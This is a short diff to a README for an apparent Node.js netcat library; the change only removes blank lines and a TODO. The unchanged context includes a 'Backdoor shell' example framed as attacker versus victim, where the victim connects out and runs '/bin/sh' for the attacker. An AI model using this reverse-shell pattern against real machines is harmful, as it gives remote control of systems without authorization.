@@ -87,7 +87,6 @@ The server will be kept alive and not being closed after the first connection. (
 |---------------------|------------------------------------|
 |`nc.port(2389).listen().serve(Buffer.from('Hello World'))`|`nc2.port(2389).connect().on('data', console.log)`|
 
-
 #### Backdoor shell
 
 | Server              | Client                             |
@@ -101,8 +100,6 @@ The `exec()` method execute the given command and pipe together his `stdout` and
 | Attacker              | Victim                           |
 |---------------------|------------------------------------|
 |`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.port(2389).retry(5000).connect().exec('/bin/sh')`|
-
-TODO... Improvement: pipe only on a specific socketId.
 
 #### Netcat as a proxy
 
